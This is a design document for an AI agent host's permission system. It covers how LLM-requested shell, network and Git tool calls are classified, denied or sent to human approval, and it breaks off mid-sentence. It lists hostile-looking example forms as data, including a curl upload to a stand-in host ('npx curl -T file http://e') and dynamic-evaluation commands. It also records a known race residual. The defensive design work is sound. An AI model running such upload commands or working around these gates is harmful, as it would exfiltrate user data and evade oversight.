# Permission Policy Design

This document describes the current permission-policy contract for Ave tool
execution. A Korean summary is available at
[docs/ko/architecture/permission-policy-design.md](../ko/architecture/permission-policy-design.md).

## Purpose

The permission system prevents tools from executing merely because an LLM or a
plugin requested them. The host classifies the request, applies hard safety
rules, asks the user or reviewer where required, and records the result.

## Policy Files

[policy-store.ts](../../src/permissions/policy-store.ts) reads the user and
system-admin `policy.json` files. For the permission reader, a valid file is a
JSON object with numeric `version:1`. Mistyped `requireExplicitApproval` and
`managed` booleans are normalized to their safe value, `true`.
The numeric top-level `version:1` is required even when the managed file only
configures `marketplaces` or `service`. Without it, permission admission denies and user editing locks;
the section readers remain independent.
A valid admin file takes precedence for each field it states. Unstated admin
fields fall through to the user value or the default. In particular, a valid
admin file that omits `requireExplicitApproval`
preserves an explicit user `false`, even if the admin file sets `managed:true`.
An explicit admin `false` also overrides user `true`; precedence is not limited
to tightening. Without either file stating the field, explicit approval stays on.
The flag controls explicit decisions on approval cards; execution-mode,
hard-deny, and reviewer gates still apply independently.

[admin-policy-file.ts](../../src/lib/admin-policy-file.ts) classifies a failed read
as absence only when it reports `ENOENT` and `lstat` confirms no directory entry.
A dangling symlink, `ENOTDIR`, or an inconclusive entry probe remains unreadable.
Administrative policy readers use this classification. Marketplace
policy returns a blocked result on unreadable input; service resolution throws
instead of falling back to the public endpoint.

For the permission reader, unreadable files, invalid JSON, non-object JSON,
or a missing, mistyped, or unsupported version produce a
conservative permission policy: `requireExplicitApproval:true`, `managed:true`,
and user edits locked. Tool admission denies while the policy is untrusted;
a reviewer, mode or card cannot authorize past unread deny rules. Loading does not fall back to a permissive user policy,
and saving rejects before creating or opening user state. Diagnostics record
the path and failure reason without policy contents or parser exception text.
Any valid admin file also locks app-mediated user-policy edits, including one
that omits `managed` or sets it to `false`.
On Windows, the shared reader also verifies administrative ownership and DACLs
on the file and its parent using pinned, non-following handles. The
[architecture contract](architecture.md#tool-governance) describes that trust
boundary. Untrusted input follows the invalid-file path; Settings displays the
path and sanitized cause, and audit records the failure.
An invalid user file cannot supply grants or bypass admission denial.
Administrative edit locking remains separate from tool admission.

### Project Rule Scope

[project-rule-files.ts](../../src/permissions/rules/project-rule-files.ts) stores project rules in the application home, keyed with the same canonical realpath and platform case folding as exact approvals. Sessions below a normal repository share the nearest eligible repository root; nested repositories keep their own rules. A `.git` directory needs a valid regular `HEAD` file and `objects` and `refs` directories. A regular `.git` file must contain a single `gitdir:` path resolving to that metadata. Linked worktrees resolve their common store through `commondir` and must have a `gitdir` backlink to this checkout's marker. Their identity remains the checkout, not the shared metadata directory. Discovery bounds reads on opened regular metadata files without launching a subprocess. An invalid or unreadable marker stops discovery and leaves the session scoped to its own cwd.

The canonical user home and every ancestor of home are excluded as inherited roots, including for sessions elsewhere below such an ancestor. A session whose cwd is exactly one of those directories keeps that exact identity. If the OS cannot provide an absolute home other than a filesystem root, discovery stays at the canonical cwd without walking up. Symlink resolution precedes discovery and home-boundary comparisons, and Windows comparisons use the same case folding as exact approvals.

Existing rule files are retained unchanged. Rules previously keyed to home or an ancestor remain available only to sessions at that exact canonical cwd; child and sibling folders no longer load them. There is no automatic copying, deletion, or expansion of those approvals. The existing project rules UI can inspect and remove them when that exact directory is selected.

## Policy Inputs

| Input | Meaning |
| --- | --- |
| Tool source | Builtin, plugin, or MCP. Used for display and audit; not a bypass. |
| Tool category | Read, write, shell, network, browser, meta, or other declared categories. |
| Trust origin | User keyboard, LLM tool argument, plugin UI, local API, routine, or headless task. |
| Project context | Normalized project root/name used for scope and audit. |
| Policy mode | Stored `strict`, `default`, `auto` or `allow`, displayed as Default, Allow writes, auto and Allow. |
| Execution surface | Foreground chat, background routine, inline plugin/MCP surface, or local API. |

## Decision Order

The [owner-approved permission decision tree](permission-decision-tree.md) is the sole source of decision order and the action-by-mode matrix. This document specifies evidence, execution boundaries and approval delivery; it does not define a second decision sequence.

The normalized request carries the tool/source, effective kind, lexical and canonical effect paths, trusted principal, mode, human availability and applicable rules/grants. Admission denial is terminal: an invalid manifest, corrupt policy store or protected host credential store cannot be repaired by a reviewer or approval. Forced one-shot requests never enter automatic review or approval memory. User-configured outside-read restrictions remain explicit rules.

Argument rewriting finishes before authorization. User script `PreToolUse` runs before any target approval and can only block; an allow result means no objection. Exact effect identity, cancellation, audit integrity, manifest capabilities, SSRF and execution-time path checks remain enforced after a permission result.

Shell analysis below supplies evidence. Historical L2/L6, exact-only host-shell and human-only unproven dispositions are superseded by the decision tree; static proof does not itself grant authority.

Shell policy consumes the canonical [typed analysis and prepared execution
contract](architecture.md#process-boundaries). One parse of the original command
feeds one static pass. The pass begins with no execution proof. It returns
`static-complete` only when a registered command grammar consumes the command
name and every argument with a fixed literal role. An unknown command, unknown
option, missing operand, unsupported form or unconsumed argument is `unproven`;
literal syntax alone never supplies a default allow result. The pass does not
evaluate a derived command string, re-enter a nested dialect, replay a
statement, or model shell execution state.
A `grep` pattern remains text even when it contains path separators,
regular-expression escapes, or dollar anchors. Literal input files, pattern
files supplied with `-f`/`--file`, exclusion files, and redirection targets
remain subject to direct path checks. A substitution makes the request
unproven rather than supplying a value to later analysis.

For `git commit`, the retained operand classifier in
[shell-path-policy.ts](../../src/tools/shell-path-policy.ts) recognizes message
values as data, including attached option values. Path-like text in a literal
message does not request filesystem access. Directory options, file-backed
messages, templates and pathspec files retain path checks. Unsupported option
arity is refused rather than used to infer later operand roles. Classification
preserves the original command bytes. Redirection targets retain their direct
path checks; substitutions make the request unproven. These operand roles do
not supply execution proof: commit remains outside the checked repository-read
grammar below.

Literal dollars and percent markers remain exact filename bytes when the parser
classifies them as literal text. Active parameter, environment and command
expansions are unproven; the floor does not substitute a prepared environment
or carry a computed value into another operand. Literal path resolution follows
symlinks before parent components and refuses unresolved links. The four exact
standard-stream operands `/dev/null`, `/dev/stdin`, `/dev/stdout` and
`/dev/stderr` are recognized before host descriptor resolution. Other
descriptor paths receive ordinary checks.

Pure output data does not acquire a path role because it contains a slash or
dollar. A substitution, parameter choice, arithmetic evaluation, condition,
loop, function, callback, splat or generated argument makes the command
unproven. The pass does not preserve possible values or filesystem states across
those constructs.

The static pass does not follow command text supplied through a child shell's
`-c`, an evaluation command, heredoc or here-string. A fully literal `-c` or
evaluation-command payload has the narrow literal-evaluator evidence described below;
heredoc and here-string code payloads remain unproven. The pass does not read a
script file or infer its contents from an earlier write. File-, stdin- and
network-backed content is an accepted indirection limit only after a registered
outer-command grammar has consumed every literal operand. A program, script or
build form outside that closed grammar does not gain a fallback proof merely
because its words are literal. Loading into the current shell
through `source` or `.` remains unsupported because it changes later execution
state.

Read-only evidence comes from the existing risk contract. Unknown executables
are `unproven`, including an absolute command path; widening reads never supplies
a static execution proof. Known mutating commands retain the write boundary.
Redirect targets carry their own effect independently of the command's argument
roles.

Debugger command options (`-ex`, `-iex`, `-eiex` and their documented long
forms) carry evaluation payloads. The floor treats those payloads as opaque and
the request as unproven. Executable, symbol, core, directory and command-file
options remain direct path operands. After an argument-forwarding option or a
possible abbreviation, later arguments receive no debugger option exemptions
because they may belong to the child program.
Potential abbreviations of value-taking options consume their value
conservatively so that an option-looking filename cannot claim a later operand.
Tool risk review and the execution sandbox govern the debugger's internal
effects. A substitution remains unproven.

The `sqlite3` [argument contract](../../src/tools/shell-sqlite-arguments.ts)
defines the supported options and consumes their values before assigning positional roles.
Role assignment first requires a fixed argument count after shell expansion.
Unknown quoted scalar data may occupy one value slot; unresolved word splitting,
globbing or array multiplicity cannot shift subsequent option or positional roles.
The database operand and `-init` file remain paths; later operands and `-cmd`
values carry SQL or dot-commands. Formatting and numeric option values are data.
Database URI filenames are decoded before normal sensitive-path, symlink and
directory checks. SQL length does not affect its role or grant authority.
Literal filenames in supported SQL and dot-command operations receive the same
path checks. SQL table names are recognized in their structural context, including
single-quoted, qualified and grouped sources, joins and `IN` table forms.
Expression strings and aliases keep their data role. Explicit `.shell` and
`.system` commands are unproven because they enter another shell; their payload
is not reparsed by the floor. The Windows system-shell dialect is unsupported.
Computed filenames,
extension loading, file-backed virtual tables, command pipes, cwd changes,
unknown options and unsupported dot-command forms are refused before approval
or execution. Database URIs combined with alternate file-opening modes are also
refused because those modes can interpret filename bytes differently. Conditional
home-directory expansion is unresolved; file-loading modes keep `:memory:` as a path.
Positional script-file detection is unsupported when it can change later argument
roles; explicit `-init` and `.read` keep their program-file path checks.
Those program files and database-resident code are not read or evaluated by
this pass; they retain write-risk review and execution sandbox controls.
This contract does not establish read-only execution or change permission grants.
Shell redirects retain direct checks; substitutions are unproven.

For `find`, starting points and file-valued primaries remain paths. Name/path
patterns, regular expressions, timestamps, numeric tests, and output formats
are expression values. In particular, `-printf` takes one format, while
`-fprintf` takes an output file followed by a format. Each primary consumes
its documented operands before the next primary is read. Unsupported or
incomplete expression syntax is unproven. Primaries that launch a command from
matched paths produce runtime argv and are always unproven; no exact or broad
rule authorizes them. The shared
operand classifier consumes canonical argv, so interleaved redirections do
not consume expression operands. File redirect targets remain independently
checked; descriptor duplication/closing consumes no argv operand. A missing
redirect target is a parse failure, distinct from an explicitly empty word.
This role classification does not relax recursive mutation/execution restrictions
or shell redirection and substitution checks.

Compiler path options preserve the complete value: `-Iinclude/sub` names
`include/sub`, and `-ooutput/tool` names `output/tool`. Known options consume
one argument; unknown and sysroot-dependent forms are unproven.
The same operand classifier checks redirects separately.

HTTP and HTTPS query values remain URL data. An equals sign does not create
a local path operand. Output options, redirects and shell substitutions keep
their normal checks.

The [archive-listing parser](../../src/shared/shell-tar-listing.ts) supplies
both risk and path classification. Only recognized listing options with
explicit local archive files establish a read operation. Entry names select
archive contents; archive files retain sensitive-path and optional read-boundary
checks. Mutation, unknown options, file- or environment-supplied options,
remote transports and expandable option words are unproven.
Redirects and hidden execution still affect risk.

Supported grammar is not the same as supported authority analysis. Arithmetic
commands, C-style loops, unsupported declaration or shell-state operations,
dynamic shell programs and unproven expansion effects are explicitly declined.
The strict grammar also declines an unfinished heredoc and a variable-shaped
literal delimiter accepted by some native Bash forms; it does not return an
earlier partial command. Version-dependent arithmetic command endings with a
continuation between their closing parentheses are also declined rather than
assigned arithmetic authority. These are documented limits, not native-equivalence
claims. [shell-policy-unsupported.test.ts](../../src/tools/__tests__/shell-policy-unsupported.test.ts)
retains these refusal cohorts, while
[shell-authority-native.test.ts](../../src/tools/__tests__/shell-authority-native.test.ts)
compares supported argv, state and owned filesystem effects with the actual
native shell. PowerShell's separate function/method restriction and public
lifecycle coverage are described in the architecture contract.

## Shell Credential And Sink Classification

Host-shell credential/sink classification supplies evidence separate from raw-word rule identity. Lane B input is bounded at 2,000 characters; Lane A retains an 8,000-character executable envelope. Quoted, non-code-consuming heredoc bodies may use the separate aggregate 65,536-byte data allowance. Global executable-token and structural limits bound analysis. A refusal leaves no static proof.

The [decision tree](permission-decision-tree.md) alone routes that evidence: unproven/destructive signals use ordinary mode/human handling unless they identify a forced floor. Host credential stores remain admission-denied. Protected control paths, critical delete, project escape, exfiltration and other-principal requests require forced one-shot approval. Ordinary secret reads are not blanket admission denials. A reviewer cannot turn incomplete parsing into execution proof or relax native confinement.

Decision cost is bounded by structural limits, not elapsed time or a work-step
verdict. The floor derives immutable facts for each source node and literal token
once. Wrapper and runner command boundaries are index ranges over the original
argv. Consumers do not construct or rescan every argv suffix. The pass never
tracks variable values, taint, current-directory candidates, file provenance,
loop iterations, callbacks or mutations between commands. It never reparses a
literal payload in another dialect. A wall-clock deadline cannot change a
permission result.

The positive-proof catalogue is the only source of `static-complete`. Each
registered grammar identifies one command or wrapper form and must consume all
arguments exactly once. It may delegate a bounded index range to another
registered grammar, but cannot infer a child argv from input, files, prior state
or command output. The catalogue starts conservatively and grows by adding a
complete grammar and its refusal tests, never by adding a denylist exception.
If any stage is unproven, the whole command input is unproven; a proven sibling
does not leave behind a separately reusable allow result.

Option arity is explicit in the registered grammar. Required-value options may
consume the following word when no attached value is present. An optional-value
option never consumes the following word: a long option accepts a value only
as `--option=value`, and a registered short option accepts it only as a
same-word suffix. A bare optional-value option leaves every later word for
ordinary option or operand parsing. An unknown following option therefore
remains unproven instead of becoming an optional value.

Command resolution is a finite grammar context, separate from the input quoting
dialect. A direct shell command may use its registered builtin or cmdlet grammar.
External delegation through `env` or Bash `exec` permanently
switches the child range to native-executable grammar: a native program does not
inherit the parent's builtin, cmdlet or alias grammar. Bash `command` preserves
its shell context, and `builtin` accepts only the registered Bash builtin subset.
Unknown delegated names remain unproven even if they spell a known cmdlet.

The grammar's `changesState` flag is a conservative command-family property,
not an inference about this invocation's effects. For families that can write
through implicit or alternate modes, every admitted form is possible-write. The
current family-level set covers all positively parsed native `curl`,
`sort` and `uniq` forms, including read-looking forms with no write option. Therefore any such form in a
multi-command input makes the whole input unproven. The authoritative flags and
baseline argv grammars live in
[shell-argument-grammar.ts](../../src/permissions/rules/shell-argument-grammar.ts);
host-bound launcher proof uses the sealed owner in
[verified-shell-command.ts](../../src/permissions/verified-shell-command.ts) and
the closed [launcher](../../src/permissions/rules/verified-launcher-argv.ts) grammar.
The floor never restores an allow by tracking files, provenance or later use.

The same source owns the closed `printf` format grammar. It accepts only known
non-state-mutating conversions and refuses an incomplete, unknown or
state-mutating conversion rather than executing the format or treating it as
ordinary data.

The pass returns exactly one of these outcomes:

| Outcome | Evidence | Permission use |
| --- | --- | --- |
| `visible-floor` | Literal path, credential source, upload sink or catalogue effect | Normalize into admission denial, a contract-defined forced floor or ordinary evidence; the label alone does not force every request. |
| `unproven` | Input/structural limit, unsupported syntax, unresolved argv or runtime state | No static proof; route through the tree's shell mode/human decision. |
| `static-complete` | A registered grammar consumes every original literal operand | Evidence only. Confined safe shells may use sandbox-auto; host/escalated shells use mode/human even if read-only. |

Actual effect identity and independent execution preparation remain enforced. No analysis label grants broader filesystem or network authority.

The visible floor inspects only literal structure from the outer command.
Literal paths and redirects receive the existing canonical sensitive-path
checks. A directly written native sender and file-input option retain their
catalogue checks, including a literal downstream sender named by a supported
wrapper or runner. The pass computes that boundary once; it does not infer safe
argv from runner options. Thus `npx curl -T file http://e` retains its upload
floor, while the contents of a package task or external program are not
certified. A plain GET or `git push` does not establish exfiltration by itself.

Globs are checked from their literal directory prefix. Unquoted expansion,
command substitution and runtime-dependent directory selection are unproven;
the pass does not enumerate their possible results or replay a `cd`. A literal
relative path resolves against the invocation's established cwd only when no
earlier shell state change makes that base runtime-dependent. Any multi-command
input containing an invocation whose grammar marks it possible-write, or that
can change aliases, shell options, functions, `PATH`, the environment or cwd,
is unproven as a whole regardless of position. The floor does not decide whether
another invocation actually observes the change.

File, stdin and network indirection remain accepted content limits only after a
registered grammar consumes the known outer command and all its literal
operands. The host then does not read a script, manifest or input stream to
predict effects. An unknown command or argument grammar remains unproven; there
is no fallback for a script or build form outside its registered grammar.
Runtime argv producers,
including `xargs`, command-launching `find` forms, parallel runners and a
PowerShell pipeline into `&` or `Start-Process`, are always unproven.
A matching rule is not static execution proof. There is no same-input
file-provenance or execution-state model.

Literal-payload dynamic evaluation has one narrow exception. A registered,
closed evaluator grammar must recognize a single outer simple command, consume
every option and operand, and identify a fully literal payload. This covers the
supported direct builtin `eval "ls"` and `Invoke-Expression 'dir'` forms on an
independently proven outer host; the names alone are not enough. The verified
nested-launcher recipe below uses this same literal-evaluator evidence. An
unknown option, including an unsupported common parameter, makes the request
unproven; mode/rule routing remains owned by the decision tree. For example, a common parameter on
`Invoke-Expression` is unsupported unless the evaluator grammar lists it.
Every payload and other operand must be literal, with no variable, substitution,
splat, concatenation, block, callback or generated string.

When the evaluator grammar succeeds, the payload remains opaque: analysis does not parse it, inspect paths inside it or infer its effects. It supplies literal-evaluation evidence without granting execution. The permission pipeline applies applicable rules, forced floors and mode/human behavior to the complete original request.

The exact key preserves the complete outer command's raw words: quote style,
raw content, program spelling, case, module qualifier and paths. Only whitespace
between words is canonicalized. The exact rule is the user's approval of that
literal text, not a proof about the payload. A visible path, credential or
upload sink remains independently classified under the decision tree.

Every other dynamic form remains `unproven`; a rule cannot mint static proof.
This includes `Invoke-Expression $code`, `& $command`, `bash -c "$code"`,
PowerShell splats, script-block invocation, `InvokeScript`,
`AddScript().Invoke()`, `[ScriptBlock]::Create`, shell functions, loops,
callbacks, command names built from output, and commands whose meaning depends
on a file or cwd changed earlier in the same input. The floor does not simulate
any of these constructs to recover an allow result.

`make` has no positive command grammar. Its variable assignments, evaluation
options and build files can select executable code, so even a literal invocation
is unproven. It receives no literal-evaluation proof.

Verified launcher admission is available only to the canonical host Bash
and PowerShell tools. The host issues a sealed in-process handle bound to the
original raw command, dialect and resolved cwd. The same handle carries the
original parse and a plan containing the proved absolute executable, owned argv
and effective child-environment controls. Permission checks, approval suggestions
and execution must use that matching identity. Execution renders only the owned
absolute image and argv; it never resolves the admitted program through PATH.
The original command remains the exact-rule and cache identity. Serialized input,
other classifier consumers and manually typed terminal commands cannot mint the
handle and receive no native proof from a matching rule.

This admission accepts one fully literal simple outer command only. Assignments,
unregistered wrappers, compound commands, pipelines, redirects and preceding
state changes refuse. The closed Bash launcher recipe below is a separate
literal-evaluation form, not general wrapper delegation. An absolute path alone
or startup-suppression flags alone supply no authority.

### PowerShell static scope boundaries

The PowerShell floor simulates a nested body only when it runs inline in the
same scope. A literal `-InFile` operand of `Invoke-WebRequest` or
`Invoke-RestMethod`, bound by any parameter prefix, returns the `visible-floor`
upload sink when every body that encloses it is a control-statement body:

- `if`, `elseif` and `else`;
- `switch` and its clause bodies;
- `foreach`, `for`, `while` and `do`;
- `try`, `catch` and `finally`.

Script-block bodies open a separate scope or depend on runtime, so the floor
declines them and returns `unproven`, which still forces the modal ask:

- `& {}` and `. {}`;
- `ForEach-Object` (including `foreach` and `%` as a pipeline stage) and
  `Where-Object` blocks;
- any scriptblock passed as an argument or assigned as a value.

A control body inside a script block is declined, because the script block
decides. The floor never replays state from another scope: a variable operand,
or a value assigned outside the body, is declined in every body. A sensitive
literal still visible in the outer command keeps its own floor.

### Checked Repository Reads

A direct native Git command can receive `static-complete` only through the
canonical host-tool handle above, a protected fixed-installation executable
proof and a supported version probe. The supported version range is Git 2.x
from 2.54 onward; an unknown version, a different major version or a PATH-derived
installation is unproven. Fixed Git installations are registered only on macOS
and Linux; Windows Git admission remains unproven. Two recipe facts must be re-proven
before a Windows installation is registered. Git for Windows maps only an exact
`/dev/null` file open to `nul`; `core.hooksPath=/dev/null` is a directory prefix,
so hooks resolve to `<drive>:\dev\null\<hook>`, which a non-administrator can
create. Windows needs a hooks value that a non-administrator cannot create. The
version probe also accepts only the upstream `git version X.Y.Z` spelling, while
Git for Windows reports `X.Y.Z.windows.N`; the probe must accept that format
without accepting other suffixes. The original raw words,
quoting and program spelling remain the rule identity. The shared executable
verifier, Bash literal-evaluation recipe and unproven runtime recipes retain
their existing contracts.

The positive grammar consumes every argument of one literal simple outer
command. Its scope is no-patch `log`/`show` with closed built-in formats,
name/raw `diff` between two revisions, closed `rev-parse` queries and
verification, and closed `branch --list` forms. The two-revision comparison
executes as `diff-tree -r --no-commit-id` with the owned metadata-only output
options. It never uses the porcelain filesystem-comparison fallback when the
repository disappears; a missing repository fails. This rewrite leaves the
original raw command as the exact-rule identity. It does not admit arbitrary
revision syntax, format strings, options or path operands. `status`, cached/staged
diffs, worktree diffs, patch output, mutation, remote operations, wrappers,
environment assignments, compounds, pipes and redirects remain unproven. Worktree comparison
is excluded because attributes and clean filters lack a complete no-execution,
no-write proof. Cached/staged diff reads can refresh a shared split-index file's
mtime even with optional locks disabled. A check-time index inspection cannot
exclude a later split-index swap, so index comparisons remain unproven.
Unsupported input offers no checked repository-read proof. Permission routing
still follows the decision tree, including auto review before headless fallback.

Before issuing a plan, the host inspects the authorized real cwd without
launching Git against repository configuration. That exact directory must contain
a real `.git` directory; ancestor discovery, gitfiles, linked worktrees, bare
repositories and external metadata are not admitted. A bounded non-following
walk covers the entire metadata tree and rejects symlinks, multiply linked
regular files, reparse points and special entries. Any `commondir` metadata
entry at any depth, root `.git/worktrees` administration even when empty,
`objects/info/alternates` and `objects/info/http-alternates` refuse. A main
checkout with linked-worktree administration therefore also refuses. These
metadata-path refusals match case-insensitively. The walk is limited to 4,096
entries and 32 levels; unreadable or over-limit evidence refuses.
The [repository-input inspector](../../src/permissions/rules/git-repository-inputs.ts)
owns these limits and the accepted configuration syntax. Configuration reads
are limited to 64 KiB per regular file; escapes, continuations, quoted values,
non-ASCII spelling, ambiguous or unsupported syntax refuse. Parsing rejects every
`include` and `includeIf` section, mailmap settings, `diff.orderFile`,
`core.worktree` and every `extensions` setting. The initial reference backend is
`files` only.

The host binds absolute `--git-dir`, `--work-tree`, `GIT_DIR`, `GIT_WORK_TREE`
and `GIT_CEILING_DIRECTORIES` values to that checked cwd and metadata. It removes
all case-insensitive inherited `GIT_*` selectors and loader/runtime selectors
before installing its owned environment. System and global configuration are
disabled, and `GIT_REFERENCE_BACKEND=files` overrides later reference-storage
configuration. The child also receives an owned `GIT_INDEX_FILE` pointing to
`.ave-readonly-index` beside the verified executable. That path must be absent:
a non-following check accepts only `ENOENT`, and its installation parent is
already verified as host-owned and non-writable by the user. Nothing is
created there. Existing entries, links, permission errors or unknown evidence
refuse. This prevents even implicit index reads in tree plumbing from opening
a mutable repository split index and refreshing its timestamps. Trusted
administrator changes remain outside the verified-install boundary.
The forced argv/environment recipe disables optional locks,
lazy fetching, replacement objects, pager, prompts, credentials, transport,
tracing, hooks, filesystem monitors, external diff/text conversion and signature
verification. It forces built-in formats and refname sorting, disables mailmap
use explicitly and overrides diff ordering with the Git null path `/dev/null`.
The [owned argv/environment recipe](../../src/permissions/rules/git-readonly-argv.ts)
owns the exact accepted options and forced values. Caller options cannot undo
these controls. Command-line overrides and owned environment selectors retain
precedence over repository configuration; the grammar excludes operations that
would invoke a configured filter or transport.

The host waits for the actual child close, including after cancellation or
an error, before rerunning the same repository-input inspector and comparing
its evidence with the checked state. The bounded state records the full `.git`
inventory, entry types, file identities and change timestamps. It also records
the worktree root and every physical ancestor through the filesystem root,
including their identities and change timestamps, within the 32-level bound.
The fingerprint includes the stat-reported device, inode, mode, uid, gid, size,
link count, mtime and ctime, plus configuration content hashes. POSIX mode
changes are covered where the filesystem reports them. Windows evidence covers
these reported stat fields, inventory and configuration bytes, with non-following
reparse checks at inspection; it does not attest POSIX permissions or DACLs.
A permission change invisible to those stat fields cannot change this digest.
Read-access timestamps are excluded. The inspector rechecks the recorded
evidence before returning. This provenance detects a detached, replaced or
restored root or ancestor. Unrelated concurrent directory activity at one of
these roots can conservatively discard an otherwise benign read. Missing or
unreadable metadata, a new link or routing file, a changed ref or packed-ref
type, a replacement root or ancestor, or any evidence mismatch discards both
stdout and stderr.
The agent receives only `Read-only Git output discarded: repository metadata changed during execution.`
with an error result. Output stays private until this check succeeds: checked
reads publish no live output, output artifact or background handle. Their
private display buffer retains the ordinary output bound.

Owner decision 2026-10-27 accepts only this confidentiality residual: a
deliberate concurrent same-user mutation after checking may make an admitted
read print content from any same-user-readable outside file when that content
parses as a reference, such as an object-id line or symbolic reference. The
file need not belong to another repository. The revision-only plumbing and
post-run discard are required mitigations; these inspections do not atomically
bind every child open or provide a race-free confidentiality guarantee. The
acceptance covers no broader file-content disclosure, helper execution, file
writes or transport. An unsafe repository already present at check time still
refuses.

The [native external key](headless-secret-encryption.md) contains exactly 32
raw bytes, with no hexadecimal or Base64 decoding. A 40- or 64-character
object-id line, with or without a trailing newline, is not an accepted key
file. Its configured and canonical paths retain the existing sensitive-path
and sandbox deny floors; this format check makes no claim about other secrets.

Visible path, credential and sink evidence still enters the decision tree. A checked plan does not turn a refused command into a checked one and supplies no extra grant. Host execution uses the mode/human route; confined execution uses its actual plan. Opaque literal-evaluator payloads are not inspected to discover repository operations or mint checked proof. Separately governed host services retain their own controls.

### Implicit Configuration And Launcher Startup

Implicit configuration is part of the argument-grammar proof. A program that
can load user or system settings which execute a helper, add arguments, upload
data or select output paths is unproven unless the admitted argv disables that
loading. The grammar records the disabling first argument and checks it at the
actual delegated program boundary, including after `env` or a runner.

Native `wget` has no positive grammar because configuration suppression is not
reliable across supported versions. Native `curl` requires exactly `-q` or
`--disable` as its first argument. A later or grouped `-q` is insufficient;
`-K` and `--config` are outside its positive grammar even after suppression.
Unknown options still refuse, and visible upload, destructive and sensitive-path
evidence remains independent. A matching exact or broad allow cannot turn
these refusals into a positive grammar proof. A case-insensitive command-shell alias that
also names a known native program must satisfy both grammars, since editions
can resolve it differently. A missing native grammar refuses the alias too.
Thus direct `curl` and `wget` aliases remain unproven; use a supported explicit
native delegation or the full cmdlet name for an unambiguous grammar.
Detection still uses the alias union to retain visible floors. Native
delegation never uses a cmdlet's grammar. Widening any removed
configuration-dependent form requires a separate complete grammar review.

Managed PowerShell execution and parsing require a separate startup proof.
`-NoProfile` suppresses profiles only. `-SettingsFile` replaces the system-wide
JSON file only, and an inherited `PSModulePath` can be augmented at startup.
Neither is a proof that user configuration cannot select execution.

The shared [verified-executable.ts](../../src/shared/verified-executable.ts)
primitive proves host-owned fixed candidates and their declared installation
roots; a declared directory requires a complete tree walk. Roots must cover the
image. It never accepts command-supplied candidates or resolves through PATH.
This proves the declared files/trees and ancestors, not binary signatures or an
arbitrary binary's transitive library closure. Fixed OS-provided images retain
the protected OS loader/library trust boundary; self-contained installations
must declare their installation root. It supplies no general admission for
arbitrary binaries or compiled-in user-controlled dependency paths.
Omitted roots default to the executable directory, preserving the outer
PowerShell installation contract. Proof and refusal are cached by platform and
the complete candidate/root specification; one root cannot lend another proof.

Parser and execution resolve the same protected absolute installation. PATH,
portable copies, per-user package roots and agent-writable installation entries
never qualify. Admission verifies the installation and its ancestors before any
native parser can run. Missing or unverifiable installations are unproven and
cannot start a parser, even when a rule was stored. A new or repaired
installation requires an application restart; stale refusal cannot grant
authority. Successful proof trusts only changes
excluded by the host-trust boundary.
POSIX admission requires root ownership, no group/other write or current write
access on every ancestor and installation entry. On macOS the fixed system
helper must return one complete plain permission record per requested entry;
extended metadata, ACL records, empty, truncated or unfamiliar output refuse.
Windows admission requires non-reparse native ACL snapshots with only trusted
system-principal ownership and mutation rights. Symlinks, elevated agents,
special entries or incomplete evidence refuse. The fixed installation walk has
65,536-entry and 64-level bounds; trusted administrator updates are host trust.

On macOS and Linux each native parser and execution child receives a fresh
host-owned `XDG_CONFIG_HOME` and settings file before startup. Host execution
preserves the caller's HOME. The first command disables module autoload,
replaces the runtime module path with exactly `$PSHOME/Modules`, and imports
Utility and Management by their absolute installation manifest paths using
the engine's core import command. An initialization error terminates before
the original command; there is no discovery fallback. Sandboxed execution
uses the same startup preparation inside its isolated profile.

Outer PowerShell line and block comments are unproven because comment syntax
can carry directives processed before the initialization prelude. The lexer
records their presence and retains its full visible-floor pass; it does not
enumerate directive names or treat an unknown directive as inert. Quoted `#`
text remains literal argument data.

A protected executable is necessary but does not establish Windows startup
proof. Both the protected System32 Windows PowerShell 5.1 path and modern
Windows PowerShell remain unproven. The legacy console's user-registry session
configuration has not been proven ignored under the launch flags; this is an
evidence gap, not an assertion of a verified exploit on that edition. Modern
Windows user JSON can select an endpoint before the prelude. Ordinary
CurrentUser execution policy alone is not the reason for refusal. No exact
rule, saved grant or broad allow upgrades an unproven startup path into proof.
The permission tree routes unproven execution separately from that proof. Executable admission remains
independent and required before any parser spawn. Administrative policy is host
trust only where user or agent mutation is excluded. Elevated processes cannot
prove an installation immutable to themselves.

An unpinned host AST parser starts only after genuine one-shot host authority
is verified and consumed, and only if executable admission independently
succeeds. MXC performs its AST inspection inside a separate confined invocation,
then applies existing structural/path gates before execution. Its internal
parser response has a separate 1 MiB byte limit; truncation or an
oversized response is a parser failure, never a partial proof. Native preflight
is deferred on unpinned paths. A pinned path retains the original full-text
literal-evaluation exact exception.

Nested launchers use one generic admission operation over declarative recipes
in [verified-launcher-argv.ts](../../src/permissions/rules/verified-launcher-argv.ts).
Every recipe must close executable installation, startup inputs, exact argv and
the effective child environment, then bind that plan through the same host-only
handle. Program names select recipe data, never program-specific proof branches.
The outer host's startup proof does not transfer to a child runtime.

| Runtime recipe | Status |
| --- | --- |
| macOS/Linux `bash --noprofile --norc -p -c CODE` | Eligible only on `darwin`/`linux` with shared absolute-image proof and the matching host handle; exactly one nonempty literal payload and no option/argument tail |
| Python | `unproven`; adjacent `._pth`/`pyvenv.cfg` and runtime-library/search-root closure are unresolved |
| fish | `unproven`; installation data/function roots and startup behavior are unresolved |
| Node | `unproven`; owned crypto startup configuration and dependency closure are unresolved |
| Nested PowerShell | `unproven`; private configuration resources and the outer preparation recipe are not reproduced by a nested recipe |
| zsh | `unproven`; unavoidable build-selected system startup input is unresolved |
| Windows PowerShell | `unproven`; Windows startup configuration proof is unresolved |

The Bash recipe suppresses profile/rc loading and inherited startup files,
functions and shell-option imports. The simple-command restriction governs
the outer launcher; payload syntax stays opaque and its effects are not
inferred. Literal-evaluation evidence describes the complete original command;
applicable rules and modes are evaluated by the permission pipeline. No nested
form gains static proof merely from an approval. Script-file, module, stdin, interactive,
encoded, abbreviated and alternative startup modes remain unproven.
Visible outer path, credential and sink operands retain their floors; payload
contents do not supply operands to that inspection.

System-scope startup files count as host-trusted only when their installation
and permissions exclude user and agent mutation. A location called system-wide
is not sufficient. Recipe guards must cover adjacent configuration and all
startup dependencies; flags alone cannot supply that closure. Local
configuration that can choose code, modules or additional arguments is not an
accepted residual.

Local transcript-file writes are an accepted host-trust residual. They do
not, by themselves, revoke cmdlet automatic allowance. This residual grants
no exception for configuration that selects modules, code or execution policy.

Package task, exec and runner forms have no positive-proof grammar because
their implicit configuration can choose startup code and execution options.
They remain in raw rule identity for detection and narrowing rules, but never
supply an allow rule. No runner-option suffix heuristic supplies proof.
Interpreter file forms have no positive grammar;
